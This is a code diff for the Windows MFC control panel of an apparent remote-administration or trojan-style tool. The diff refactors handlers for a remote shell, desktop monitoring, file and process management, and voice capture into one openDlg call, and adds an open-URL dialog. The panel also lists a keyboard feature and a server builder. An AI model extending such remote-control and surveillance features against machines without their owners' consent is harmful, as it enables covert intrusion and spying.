@@ -7,6 +7,7 @@
 #include <process.h>
 #include "WindowManagerDlg.h"
 #include "VoiceManage.h"
+#include "OpenUrlDlg.h"
 
 #ifndef _HEAD_COMMAND_H
 #define _HEAD_COMMAND_H
@@ -149,6 +150,7 @@ ON_MESSAGE(WM_PROCESS_SHOW, OnProcessShow)
 ON_MESSAGE(WM_WINDOW_MANAGER_DLG_SHOW, OnWindowManagerDlgShow)
 ON_COMMAND(IDM_ONLINE_KEYBOARD, &CMaizangDlg::OnOnlineKeyboard)
 ON_COMMAND(IDM_ONLINE_CLASSROOM, &CMaizangDlg::OnOnlineClassroom)
+ON_COMMAND(IDM_ONLINE_OPENURL, &CMaizangDlg::OnOnlineOpenurl)
 END_MESSAGE_MAP()
 
 /////////////////////////////////////////////////////////////////////////////
@@ -317,14 +319,6 @@ void CMaizangDlg::OnSize(UINT nType, int cx, int cy)
 		rc.right=cx;
 		rc.bottom=cy;
 		m_wndStatusBar.MoveWindow(rc);
-		//	m_wndStatusBar.SetPaneInfo(0,m_wndStatusBar.GetItemID(0),SBPS_POPOUT,cx);
-		/*
-		void SetPaneInfo(  设置状态条的显示状态
-		int nIndex,   状态条的索引
-		UINT&  nID，   状态条的字符ID
-		UINT&  nStyle  状态条的样式
-		int&  cxWidth  状态条的宽度
-		*/
 	}
 	
 	if(m_ToolBar.m_hWnd!=NULL)//工具条
@@ -339,8 +333,6 @@ void CMaizangDlg::OnSize(UINT nType, int cx, int cy)
 	
 	
 }
-
- 
 
 //CListCrl（消息列表 上线列表） 列信息名称的初始化  
 int CMaizangDlg::InitList()
@@ -458,15 +450,6 @@ void CMaizangDlg::OnMainClose()
 {
 	// TODO: Add your command handler code here
 	::PostMessage(this->m_hWnd,WM_CLOSE,0,0);
-	/*
-	BOOL PostMessage(
-	HWND hWnd,      // handle of destination window
-	UINT Msg,       // message to post
-	WPARAM wParam,  // first message parameter
-	LPARAM lParam   // second message parameter
-	);
-	
-	*/
 }
 
 
@@ -503,85 +486,14 @@ void CMaizangDlg::CreatStatusBar()
 void CMaizangDlg::OnOnlineAudio() 
 {
 	// TODO: Add your command handler code here
-	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
-	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
-	if(iCurrSel >= 0)
-	{	
-		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
-		m_CurrIndex = iCurrSel;
-	}
-	else
-	{
-
-		m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
-	if (m_ChoseSocket ==  INVALID_SOCKET) 
-	{
-		MessageBox("您还未选中任何主机");
-		return;
-	}
-	if(m_ChoseSocket !=  INVALID_SOCKET)
-	{
-		MsgHead m_MsgHead;
-		m_MsgHead.dwCmd = CMD_VOICE;
-		m_MsgHead.dwSize = 0;
-		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
-		{
-			VoiceManage voiceManage;
-			voiceManage.VoiceTransmit();
-			voiceManage.DoModal();
-		}
-	}
-
-	//MessageBox("声音");
+    openDlg(CMD_VOICE);
 }
 
 //远程终端
 void CMaizangDlg::OnOnlineCmd() 
 {
 	// TODO: Add your command handler code here
-//	MessageBox("远程终端");
-	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
-	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
-	if(iCurrSel >= 0)
-	{	
-		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
-		m_CurrIndex = iCurrSel;
-	}
-	else
-	{
-        m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
- 
-	
-	if (m_ChoseSocket ==  INVALID_SOCKET) 
-	{
-		MessageBox("您还未选中任何主机");
-		return;
-	}
-
- 	if(m_ChoseSocket != INVALID_SOCKET)
-	{
-		MsgHead m_MsgHead;
-		m_MsgHead.dwCmd = CMD_CMD_SHELL_REQUEST;
-		m_MsgHead.dwSize = 0;
-		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
-		{
-		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
-		}
-		else
-		{
-		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
-		   shutdown(m_ChoseSocket, 0x02);
-		   closesocket(m_ChoseSocket);
-		}
-		
-	}
-
-
-
+ openDlg(CMD_CMD_SHELL_REQUEST);
 }
 
 
@@ -596,128 +508,21 @@ void CMaizangDlg::OnCreateServer(){
 void CMaizangDlg::OnOnlineDesktop() 
 {
 	// TODO: Add your command handler code here
-	//MessageBox("桌面监控");
-	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
-	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
-	if(iCurrSel >= 0)
-	{	
-		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
-		m_CurrIndex = iCurrSel;
-	}
-	else
-	{
-        m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
- 
-	
-	if (m_ChoseSocket ==  INVALID_SOCKET) 
-	{
-		MessageBox("您还未选中任何主机");
-		return;
-	}
-
- 	if(m_ChoseSocket != INVALID_SOCKET)
-	{
-		MsgHead m_MsgHead;
-		m_MsgHead.dwCmd = CMD_SCREEN_REQUEST;
-		m_MsgHead.dwSize = 0;
-		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
-		{
-		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
-		}
-		else
-		{
-		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
-		   shutdown(m_ChoseSocket, 0x02);
-		   closesocket(m_ChoseSocket);
-		}
-		
-	}
-	
+   openDlg(CMD_SCREEN_REQUEST);	
 }
 
 //文件管理 
 void CMaizangDlg::OnOnlineFlie()
 {
 	// TODO: Add your command handler code here
-	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
-	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
-	if(iCurrSel >= 0)
-	{	
-		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
-		m_CurrIndex = iCurrSel;
-	}
-	else
-	{
-		 
-        m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
- 
-	
-	if (m_ChoseSocket ==  INVALID_SOCKET) 
-	{
-		MessageBox("您还未选中任何主机");
-		return;
-	}
-
- 	if(m_ChoseSocket != INVALID_SOCKET)
-	{
-	//	CFileManage m_manage;
-  
- 
-		MsgHead m_MsgHead;
-		m_MsgHead.dwCmd = CMD_FILEMANAGE;
-		m_MsgHead.dwSize = 0;
-		if (SendMsg(m_ChoseSocket,NULL,&m_MsgHead) == TRUE)
-		{
-		 
-		     m_wndStatusBar.SetText("命令发送成功", 2, 0);
-		}
-		else
-		{
-		   m_wndStatusBar.SetText("命令发送失败", 2, 0);
-		   shutdown(m_ChoseSocket, 0x02);
-		   closesocket(m_ChoseSocket);
-		}
-		
-	}
-	
+	openDlg(CMD_FILEMANAGE);
 }
 
 //进程管理 
 void CMaizangDlg::OnOnlineProcess()
 {
 	// TODO: Add your command handler code here
-	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
-	int iCurrSel = m_List_Online.GetNextSelectedItem(pos);
-	if (iCurrSel >= 0){
-		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
-		m_CurrIndex = iCurrSel;
-	}
-	else{
-		m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
-	if (m_ChoseSocket == INVALID_SOCKET){
-		MessageBox("你还未选中任何主机");
-		return;
-	}
-	if (m_ChoseSocket != INVALID_SOCKET){
-		MsgHead m_MsgHead;
-		m_MsgHead.dwCmd = CMD_PROCESS_SHOW;
-		m_MsgHead.dwSize = 0;
-		if (SendMsg(m_ChoseSocket, NULL, &m_MsgHead) == TRUE){
-			m_wndStatusBar.SetText("命令发送成功", 2, 0);
-		}
-		else{
-			m_wndStatusBar.SetText("命令发送失败", 2, 0);
-			shutdown(m_ChoseSocket, 0x02);
-			closesocket(m_ChoseSocket);
-		}
-	}
-
+	openDlg(CMD_PROCESS_SHOW);
 }
 
 //注册表管理 
@@ -829,8 +634,8 @@ void CMaizangDlg::CreatToolBar()
 	m_ToolBar.SetButtonText(5,"文件管理");
 	m_ToolBar.SetButtonText(6,"窗口管理");
 	m_ToolBar.SetButtonText(7,"终端管理");
-	m_ToolBar.SetButtonText(8,"注册表管理");
-	m_ToolBar.SetButtonText(9,"服务管理");
+	m_ToolBar.SetButtonText(8,"打开网页");
+	m_ToolBar.SetButtonText(9,"发送广播");
 	m_ToolBar.SetButtonText(11,"版权");
 	m_ToolBar.SetButtonText(12,"教室功能");
 	m_ToolBar.SetButtonText(13,"生成服务端");
@@ -898,12 +703,8 @@ unsigned  __stdcall  ThreadAccept(void * pParam)
 									 &dwThreadId);
 		CloseHandle(m_hThread);
 		}
-
 	}
- 
 	return 0;
-	
-	
 }
 
 
@@ -1224,4 +1025,12 @@ LRESULT CMaizangDlg::OnWindowManagerDlgShow(WPARAM wParam, LPARAM lParam){
 	pWindowManagerDlg->m_MainSocket = pInput->sMainConnect;
 	pWindowManagerDlg->windowListShow();
 	return 0;
+}
+
+void CMaizangDlg::OnOnlineOpenurl()
+{
+	// TODO: 在此添加命令处理程序代码
+	COpenUrlDlg *pOpenUrlDlg = new COpenUrlDlg;
+	pOpenUrlDlg->Create(IDD_OPENURL, GetDesktopWindow());//创建一个非模态对话框
+	pOpenUrlDlg->ShowWindow(SW_SHOW);
 }
